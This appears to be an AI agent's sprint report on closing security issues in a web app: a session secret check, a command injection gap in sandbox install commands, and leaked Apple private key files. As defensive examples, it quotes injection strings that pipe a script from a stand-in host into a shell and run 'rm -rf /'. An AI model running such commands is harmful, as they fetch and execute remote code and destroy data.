# Sprint A — Critical Security Closure — Report

**Date:** 2026-07-11
**Scope:** Per `docs/ROADMAP-V2-DEPENDENCY-BASED.md`, Sprint A only.
**Mode:** Zero downtime. No database schema changes. No breaking API changes. No new planning/documentation beyond this report.

---

## 1. Hardcoded session secret fallback (SEC-CRIT-001)

**Status: Already remediated in the current codebase — verified, no further change needed.**

`server/auth.ts:66-85` was inspected directly (not just the security doc). The code already:

- Uses `process.env.SESSION_SECRET` when set.
- **Hard-crashes at startup** if `SESSION_SECRET` is missing and `NODE_ENV=production` (`throw new Error(...)`), with no silent fallback in production.
- In non-production only, generates an ephemeral `crypto.randomBytes(32)` secret with an explicit console warning that sessions won't persist across restarts — this is a reasonable developer-experience allowance, not a production security hole, since it never activates when `NODE_ENV=production`.

`SESSION_SECRET` is present in this environment as a Replit Secret (confirmed via `viewEnvVars`-equivalent check during project setup), so production behavior is: real, persistent, secret-backed sessions.

No code change was required for this item. Verified by direct code read, not by trusting `SECURITY.md`'s prior "open" status — the register was stale.

---

## 2. Command injection in sandbox execution (SEC-CRIT-002)

**Status: Two of three code paths were already remediated; one path (`installCmd`) was still vulnerable and has been fixed in this sprint.**

### What was already fixed (verified, unchanged by this sprint)
- `server/sandbox-runner.ts` — `sanitizeCommand()` (allowlist of `node`, `npm`, `npx`, `python`, `python3`, `pip`, `pip3`, `serve`, `vite`, `next`, `nuxt`, `tsx`, `ts-node`; rejects `; & | \` ( ) { } ! > <` and newlines) is applied to `startCmd` before it reaches `spawn("/bin/sh", ["-c", ...])`.
- `server/sandbox-routes.ts` build endpoint (`POST /api/sandbox/projects/:id/build`) already validates `buildCmd` through `sanitizeCommand()` before `spawn()`.
- `stopProcess()` already uses `process.kill(-pid, signal)` with an integer-validated PID instead of a shell `kill` string.

### What this sprint fixed
- **`server/sandbox-runner.ts`, `startProcess()`:** `opts.installCmd` — user-settable via `PATCH /api/sandbox/projects/:id` (installCmd is in the allowed-fields list at `server/sandbox-routes.ts:354`) — was passed directly into `runCommand()`, which calls `spawn(cmd, { shell: true })`. This bypassed `sanitizeCommand()` entirely: a project owner could set `installCmd` to `npm install; curl evil.example/x.sh | sh` and it would execute unsanitized on the next project start.
- Fix applied: `opts.installCmd` is now passed through the same `sanitizeCommand()` allowlist/metacharacter check as `startCmd` and `buildCmd` before being handed to `runCommand()`. If validation fails, the error is broadcast to the sandbox log stream and the start operation aborts (same failure UX pattern already used for `buildCmd`).
- Verified with direct calls to `sanitizeCommand()`: legitimate commands (`npm install`, `node index.js`, `npx vite --host 0.0.0.0`) pass unchanged; injection attempts (`npm install; rm -rf /`, `curl evil.com | sh`) are rejected with `"أمر غير آمن — يحتوي رموز ممنوعة"`.

**Files changed:** `server/sandbox-runner.ts` only. No route signatures, request/response shapes, or database fields changed.

---

## 3. Apple Distribution credentials in the repository

**Status: Fixed in this sprint.**

Findings:
- Four real Apple Sign-In private keys (`.p8` files, `-----BEGIN PRIVATE KEY-----` content) were committed and git-tracked under `attached_assets/`:
  - `AuthKey_8J92ZKSZ3Q_1775757970434.p8`
  - `AuthKey_AULA7HU8BF_1783382531085.p8`
  - `AuthKey_KN4P92YS59_1775808283922.p8`
  - `AuthKey_X2KTZG88K9_1775821946970.p8`
- All application code that consumes Apple credentials already loads them from environment variables, not from these files: `server/config/apple.ts` and `server/routes.ts:391-514` both read `APPLE_CLIENT_ID`, `APPLE_TEAM_ID`, `APPLE_KEY_ID`, `APPLE_PRIVATE_KEY` from `process.env`. `render.yaml`, `codemagic.yaml`, and `DEPLOYMENT_GUIDE.md` also correctly reference these as environment/secret values, never inline. The `.p8` files in `attached_assets/` were dead weight from onboarding — not read by any code path (confirmed via repo-wide grep for filename references — none found).

Actions taken:
- Removed all four `.p8` files from the working tree and from git tracking (`git rm --cached` + delete).
- Hardened `.gitignore`: added `*.p8`, `*.mobileprovision`, `attached_assets/*.p8`, and `attached_assets/AuthKey_*` so these credential types cannot be re-committed by accident going forward (alongside the pre-existing `*.pem`, `*.p12`, `*.key`, `distribution*` rules).
- No code change was needed since the runtime already loads Apple credentials exclusively from `APPLE_PRIVATE_KEY` (env var) — this sprint only removed the redundant, leaked file copies and closed the re-commit path.

**Important caveat — outside this sprint's authorized scope, flagged for the user's awareness, not acted on:**
These files were removed from the current tree and from git's index, but they remain recoverable from prior commits in git history (`git log` shows this repo's history includes them). A full history rewrite (e.g. BFG/filter-repo + force-push) is a destructive, repo-wide operation that would rewrite every commit SHA and requires a force-push to the remote — that is explicitly outside "additive only, zero downtime, no new planning" and was not performed. **Recommend, outside of this sprint:** rotate/revoke these four Apple Sign-In keys in the Apple Developer portal (Certificates, Identifiers & Profiles → Keys) since they must be treated as compromised regardless of git-history cleanup, and separately decide whether a history rewrite is warranted.

---

## 4. Verification that production behavior is unchanged

- Workflow restarted cleanly after all changes; startup log shows the same sequence as before this sprint: config bootstrap (`11 modules loaded · 7 warnings` — all pre-existing, unrelated warnings about optional integrations), MongoDB connection, QMeet routes, DeploymentCloud routes, email marketing routes, cron jobs — no new errors, no new warnings introduced.
- Homepage screenshot confirms the public site renders identically to before this sprint (hero, nav, pricing CTA all present); the only browser-console entry is the pre-existing, expected `401` on `/api/user` for a logged-out visitor.
- `sanitizeCommand()` behavior spot-checked directly: all previously-valid sandbox commands (`npm install`, `node index.js`, `npx vite --host 0.0.0.0`) still pass; only injection payloads are newly rejected on the `installCmd` path — this is the intended additive tightening, not a behavior change for legitimate users.
- No database schema, collection, or index was touched. No API route, request shape, or response shape was changed. No existing feature flags were modified.

---

## Summary

| Item | Status | Files touched |
|---|---|---|
| 1. Hardcoded session secret fallback | Already fixed — verified only | none |
| 2. Command injection in sandbox execution | `startCmd`/`buildCmd` already fixed; `installCmd` gap found and closed | `server/sandbox-runner.ts` |
| 3. Apple Distribution credentials in repo | Fixed — 4 leaked `.p8` files removed from tree/index, `.gitignore` hardened | `.gitignore`, deletion of 4 files under `attached_assets/` |
| 4. Production behavior verification | Confirmed unchanged | — |

**Sprint A is complete.** Per instruction, stopping here — Sprint B (high-severity security closure) has not been started and requires separate approval.
